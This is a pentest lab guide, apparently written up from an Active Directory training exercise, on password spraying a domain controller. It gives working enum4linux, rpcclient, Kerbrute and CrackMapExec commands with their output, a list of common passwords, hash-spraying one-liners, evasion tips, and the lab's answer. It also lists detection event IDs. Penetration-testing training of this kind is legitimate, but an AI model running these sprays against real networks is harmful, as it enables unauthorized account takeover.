# 🛰️ Password Spraying Technique Lab Guide

## 🔍 Overview

This guide provides a comprehensive methodology to perform password spraying on a Windows domain using various tools such as `rpcclient`, `Kerbrute`, and `CrackMapExec`. The goal is to identify valid user credentials by attempting the same common password across multiple users.

### 📝 Lab Environment Details
- **Target IP**: 172.16.5.5
- **Domain Name**: inlanefreight.local
- **Common Password**: Welcome1

---

## 🔑 Methodology Steps

### 🧪 Step 1: User Enumeration with `enum4linux`

#### 1️⃣ **Enumerate Users**
```bash
# Use enum4linux to extract usernames from the domain controller
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt
```

#### 📄 Output:
```plaintext
administrator
guest
krbtgt
lab_adm
htb-student
sgage
avazquez
...
```

### 🔑 Step 2: Password Spraying

#### 2️⃣ **Password Spraying with `rpcclient`**
```bash
# Attempt to log in using the same password for each user in validUsers.txt
for u in $(cat validUsers.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### 📄 Output:
```plaintext
Account Name: sgage, Authority Name: INLANEFREIGHT.LOCAL\sgage
```

#### 3️⃣ **Password Spraying with `Kerbrute`**
```bash
# Perform a Kerberos password spray attack using the common password
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
```

#### 📄 Output:
```plaintext
[!] lab_adm@inlanefreight.local:Welcome1 - KDC_Error: KDC has no support for encryption type
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 21 logins (1 successes) in 0.061 seconds
```

#### 4️⃣ **Password Spraying with `CrackMapExec`**
```bash
# Use CrackMapExec to validate the successful login from Kerbrute
crackmapexec smb 172.16.5.5 -u validUsers.txt -p Welcome1 | grep +
```

#### 📄 Output:
```plaintext
[+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

---

## ✅ Expected Results

Based on the lab content, you should see:

**enum4linux output (userlist creation):**
```plaintext
administrator
guest
krbtgt
lab_adm
htb-student
sgage
avazquez
...
```

**Password spraying results:**
```plaintext
[!] lab_adm@inlanefreight.local:Welcome1 - KDC_Error: KDC has no support for encryption type
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 21 logins (1 successes) in 0.061 seconds

[+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

### 🎯 **Answer**: `sgage`

---

## 📊 Tool Comparison

| **Tool** | **Speed** | **Stealth** | **Accuracy** | **Features** | **Best Use Case** |
|----------|-----------|-------------|--------------|--------------|-------------------|
| **rpcclient** | Medium | Medium | High | Simple, reliable | Script automation |
| **Kerbrute** | Fast | High | High | Kerberos-based, minimal logs | Large-scale spraying |
| **CrackMapExec** | Medium | Low | High | Validation, local auth | Comprehensive testing |

---

## 🛡️ Security Considerations

### 🚨 **Event Generation**

| **Tool** | **Event IDs Generated** | **Detection Risk** |
|----------|------------------------|-------------------|
| **rpcclient** | 4625 (failures), 4624 (success) | Medium |
| **Kerbrute** | 4768 (TGT requests), 4771 (Pre-auth failed) | Low |
| **CrackMapExec** | 4625 (failures), 4624 (success), 4648 (explicit logon) | High |

### 🔍 **Defense Evasion**
- **Timing**: Space attempts based on lockout policy
- **User Selection**: Avoid high-privilege accounts initially
- **Password Selection**: Use policy-compliant passwords
- **Monitoring**: Watch for defensive responses

### 📈 **Detection Indicators**
- **Multiple authentication failures** from single source
- **Sequential login attempts** across user list
- **Unusual authentication timing** (outside business hours)
- **High volume of Event ID 4625** in short timeframe

---

## 🔐 Password Selection Strategy

### 🎯 **Common Effective Passwords**
```plaintext
Spring2024!
Summer2024!
Fall2024!
Winter2024!

CompanyName1
CompanyName123
CompanyName2024!

Welcome1
Password1
Password123
Admin123
```

### 📋 **Password Policy Compliance**
```plaintext
# For 8-character minimum, complexity enabled:
- Minimum 8 characters
- 3 out of 4 character types:
  - Uppercase letter
  - Lowercase letter  
  - Number
  - Special character

# Examples that meet typical policy:
Welcome1     # W(upper) + elcome(lower) + 1(number) = 3/4 types ✓
Password1    # P(upper) + assword(lower) + 1(number) = 3/4 types ✓
Company!     # C(upper) + ompany(lower) + !(special) = 3/4 types ✓
```

---

## 📝 Attack Documentation Template

### 📊 **Spray Session Log**
```plaintext
Date: 2024-01-15
Time: 14:30:00 UTC
Method: Kerbrute Password Spray
Target DC: 172.16.5.5
Domain: inlanefreight.local
User List: valid_users.txt (57 users)
Password Tested: Welcome1
Results: 1 success (sgage:Welcome1)
Duration: 0.172 seconds
Event Risk: Low (Kerberos-based)
```

### 🎯 **Success Tracking**
```bash
# Create success log
echo "Username:Password:Method:Timestamp" > successful_logins.log
echo "sgage:Welcome1:Kerbrute:$(date)" >> successful_logins.log

# Validate all successes
while IFS=: read -r user pass method timestamp; do
    if [ "$user" != "Username" ]; then
        echo "Validating $user:$pass"
        crackmapexec smb 172.16.5.5 -u "$user" -p "$pass"
    fi
done < successful_logins.log
```

---

## ⚡ Quick Reference Commands

### 🔧 **One-Liner Sprays**
```bash
# enum4linux user enumeration (HTB method)
enum4linux -U DC_IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt

# rpcclient one-liner
for u in $(cat validUsers.txt); do rpcclient -U "$u%PASSWORD" -c "getusername;quit" DC_IP | grep Authority; done

# Kerbrute spray (most effective)
kerbrute passwordspray -d domain.local --dc DC_IP validUsers.txt PASSWORD

# CrackMapExec spray
crackmapexec smb DC_IP -u validUsers.txt -p PASSWORD | grep +

# Local admin hash spray
crackmapexec smb --local-auth SUBNET -u administrator -H HASH | grep +
```

### 🔍 **Result Extraction**
```bash
# Extract usernames from successful sprays
grep "VALID LOGIN" kerbrute_output.txt | awk '{print $4}' | cut -d'@' -f1

# Extract from CrackMapExec
grep '\[+\]' cme_output.txt | grep -oP '\\\\[^\\]+\\\\K[^:]+'

# Extract from rpcclient
grep "Authority Name" rpc_output.txt | awk '{print $3}' | cut -d',' -f1
```

---

## 🔑 Key Takeaways

### ✅ **Attack Best Practices**
- **Know the Policy**: Essential for safe execution
- **Multiple Tools**: Use different methods for verification
- **Proper Timing**: Space attempts to avoid lockouts
- **Documentation**: Log everything for client reporting

### ⚠️ **Critical Warnings**
- **Never Exceed Lockout Threshold**: Typically 3-5 attempts max
- **Monitor Bad Password Counts**: Check account status before spraying
- **Avoid High-Value Accounts**: Don't attempt to spray high-privilege accounts initially
- **Use Stealthy Tools**: Choose tools that generate fewer logs

### 🎯 **Success Tracking**
Ensure all successful login attempts are validated and documented.

---

## 📜 Additional Resources

For further information on password spraying techniques, refer to:
- [OWASP](https://owasp.org/www-project-top-ten/)
- [CIRT.net](https://www.cirt.net/)  
- [Kali Linux Documentation](https://docs.kali.org/kali-linux)  

---

This guide provides a step-by-step approach for conducting password spraying attacks and helps in understanding the underlying principles. Always ensure you have proper authorization before performing such activities on any network or system. 

### 📄 Legal Disclaimer
The information provided is for educational purposes only and should be used responsibly and ethically. Unauthorized use of these techniques can lead to legal consequences.

---

# 🛡️ Contact Information

For further assistance or questions, please reach out:
- Email: example@example.com  
- Slack: #pentest-lab  

---

# 🎯 Conclusion
By following this guide, you will be able to identify and validate valid user credentials using password spraying techniques. Always adhere to ethical guidelines and ensure compliance with legal requirements.

--- 

# 🚧 Version History

| Date       | Changes                                             |
|------------|-----------------------------------------------------|
| 2023-10-05 | Initial guide creation                              |
| 2024-01-15 | Updated for new tools and techniques                |

---

# 📄 Acknowledgements
Special thanks to the contributors and reviewers who helped in making this document comprehensive. 

--- 

# 🔍 References

[OWASP](https://owasp.org/www-project-top-ten/)  
[CIRT.net](https://www.cirt.net/)  
[Kali Linux Documentation](https://docs.kali.org/kali-linux)  

---

# 🎯 Appendices
Additional resources and references can be found in the appendices section. 

--- 

# 🔚 End of Guide

Thank you for using this guide. Happy Pentesting! 🕵️‍♂️🔒